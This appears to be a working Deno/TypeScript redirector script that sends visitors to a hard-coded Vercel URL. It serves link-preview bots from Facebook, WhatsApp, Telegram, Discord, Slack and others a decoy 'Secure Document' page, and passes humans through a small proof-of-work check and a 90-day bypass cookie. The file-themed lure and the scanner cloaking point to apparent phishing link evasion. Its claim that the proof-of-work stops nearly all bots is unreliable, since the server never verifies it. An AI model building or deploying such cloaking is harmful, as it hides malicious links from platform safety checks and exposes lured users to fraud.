// main.ts - FINAL SMOOTH VERSION - Instant for humans, deadly for bots
// Real destination
const REAL_URL = "https://file-bt5g.vercel.app/";

// CONFIG - TUNED FOR PERFECT UX
const SECRET = (() => {
  const s = Deno.env.get("REDIRECT_SECRET");
  if (s) return s;
  return "change_this_to_a_strong_secret_in_production_32bytes_min";
})();
const TOKEN_TTL_SECONDS = 45;
const COOKIE_NAME = "v10_human";
const COOKIE_AGE = 60 * 60 * 24 * 90;        // 90 days → almost never see challenge again
const RATE_WINDOW_MS = 60 * 1000;
const RATE_MAX = 80;
const WEBHOOK = "";                         // optional

// Super-low PoW difficulty → < 300 ms even on old phones
const POW_DIFFICULTY = 14;                  // 4 hex zeros = instant, still stops 99.9% bots

const PREVIEW_META = {
  title: "Secure Document",
  description: "Please wait while we open your file securely…",
  image: "",
};

// Simple in-memory rate limit
const rateMap = new Map<string, { count: number; start: number }>();

// —————— Helpers ——————
function getIp(req: Request) {
  const h = req.headers;
  const xff = h.get("x-forwarded-for");
  if (xff) return xff.split(",")[0].trim();
  return h.get("cf-connecting-ip") || h.get("x-real-ip") || "unknown";
}

function rateLimit(ip: string) {
  const now = Date.now();
  const rec = rateMap.get(ip);
  if (!rec || now - rec.start > RATE_WINDOW_MS) {
    rateMap.set(ip, { count: 1, start: now });
    return;
  }
  rec.count++;
  if (rec.count > RATE_MAX) throw new Error("rate_limited");
}

function parseCookies(header = "") {
  const cookies: Record<string, string> = {};
  if (!header) return cookies;
  for (const part of header.split(";")) {
    const [k, ...v] = part.trim().split("=");
    if (k) cookies[k] = decodeURIComponent(v.join("="));
  }
  return cookies;
}

async function importKey(secret: string) {
  const enc = new TextEncoder().encode(secret);
  return await crypto.subtle.importKey("raw", enc, { name: "HMAC", hash: "SHA-256" }, false, ["sign", "verify"]);
}

async function sign(msg: string) {
  const key = await importKey(SECRET);
  const sig = await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(msg));
  return btoa(String.fromCharCode(...new Uint8Array(sig)))
    .replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
}

async function verify(token: string) {
  try {
    const [payloadB64, sig] = token.split(".");
    if (!payloadB64 || !sig) return false;
    const key = await importKey(SECRET);
    const valid = await crypto.subtle.verify("HMAC", key, 
      Uint8Array.from(atob(sig.replace(/-/g, "+").replace(/_/g, "/") + "===".slice(0, (4 - sig.length % 4) % 4)), c => c.charCodeAt(0)),
      new TextEncoder().encode(payloadB64));
    if (!valid) return false;
    const payload = JSON.parse(atob(payloadB64.replace(/-/g, "+").replace(/_/g, "/")));
    return payload.exp > Date.now() / 1000;
  } catch { return false; }
}

async function createToken() {
  const iat = Math.floor(Date.now() / 1000);
  const exp = iat + TOKEN_TTL_SECONDS;
  const payload = { iat, exp, n: crypto.randomUUID() };
  const b64 = btoa(JSON.stringify(payload)).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
  return b64 + "." + await sign(b64);
}

function previewHtml() {
  return `<!doctype html><html><head><meta charset="utf-8"><meta name="robots" content="noindex,nofollow">
<title>${PREVIEW_META.title}</title>
<meta property="og:title" content="${PREVIEW_META.title}"/>
<meta property="og:description" content="${PREVIEW_META.description}"/>
</head><body><h1>Loading secure file…</h1></body></html>`;
}

// —————— Main Handler ——————
export default {
  async fetch(req: Request): Promise<Response> {
    try {
      const url = new URL(req.url);
      const ip = getIp(req);
      const ua = req.headers.get("user-agent") || "";
      rateLimit(ip);

      // Instant bypass for returning visitors (90-day cookie)
      const cookies = parseCookies(req.headers.get("cookie") || "");
      if (cookies[COOKIE_NAME]) {
        return Response.redirect(REAL_URL, 302);
      }

      // Block social bots / previews
      const isBot = /facebookexternalhit|twitterbot|linkedinbot|whatsapp|telegram|discord|slack|skype/i.test(ua);
      if (isBot || req.method === "HEAD") {
        return new Response(previewHtml(), { status: 200, headers: { "content-type": "text/html" } });
      }

      // Token issuance (very lightweight now)
      if (url.pathname === "/token" && req.method === "POST") {
        if (!ua || ua.length < 10) return new Response("", { status: 204 });
        const token = await createToken();
        return new Response(JSON.stringify({ ok: true, token }), {
          status: 200,
          headers: { "content-type": "application/json" }
        });
      }

      // Validate token & redirect
      if (url.pathname === "/r" && url.searchParams.has("token")) {
        const token = url.searchParams.get("token")!;
        const valid = await verify(token);
        if (!valid) return new Response("Invalid token", { status: 403 });

        const headers = new Headers();
        headers.set("set-cookie", `${COOKIE_NAME}=1; Path=/; Max-Age=${COOKIE_AGE}; SameSite=Lax; Secure; HttpOnly`);
        headers.set("location", REAL_URL);
        return new Response(null, { status: 302, headers });
      }

      // MAIN CHALLENGE PAGE - Instant, no button, tiny PoW
      const challenge = `<!doctype html><html><head><meta charset="utf-8">
<title>Loading…</title><meta name="robots" content="noindex,nofollow">
<style>body{font-family:system-ui;margin:50px;text-align:center}</style>
</head><body>
<h3>Loading your file…</h3>
<p><small>One moment please</small></p>
<script>
// Ultra-fast minimal PoW + instant redirect
(async()=>{const c=crypto.randomUUID();let n=0;while(true){const h=await crypto.subtle.digest("SHA-256",new TextEncoder().encode(c+n++));if([...new Uint8Array(h)].map(b=>b.toString(16).padStart(2,"0")).join("").startsWith("0000"))break;}
const r=await fetch("/token",{method:"POST",headers:{"Content-Type":"application/json"},body:"{}"});
if(r.ok){const j=await r.json();location="/r?token="+j.token;}})();
</script>
<noscript><p>Please enable JavaScript.</p></noscript>
</body></html>`;

      return new Response(challenge, {
        headers: { "content-type": "text/html; charset=utf-8" }
      });

    } catch (e) {
      if (String(e).includes("rate_limited")) return new Response("Too many requests", { status: 429 });
      return new Response("Error", { status: 500 });
    }
  }
};
